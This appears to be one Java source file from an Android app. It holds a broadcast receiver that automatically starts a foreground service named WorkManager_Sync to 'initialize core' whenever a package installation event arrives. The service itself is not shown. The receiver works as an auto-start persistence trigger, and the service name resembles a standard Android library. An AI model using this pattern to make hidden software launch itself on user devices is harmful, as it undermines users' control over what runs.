package com.labs.labrats;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * TRIGGER: Auto-starts the service upon package installation events.
 */
public class InstallReferrerReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d("InstallTrigger", "Package installation event detected. Initializing core.");
        
        Intent serviceIntent = new Intent(context, WorkManager_Sync.class);
        serviceIntent.setAction(Constants.ACTION_START_CORE);
        
        try {
            androidx.core.content.ContextCompat.startForegroundService(context, serviceIntent);
        } catch (Exception e) {
            Log.e("InstallTrigger", "Auto-start failed: " + e.getMessage());
        }
    }
}
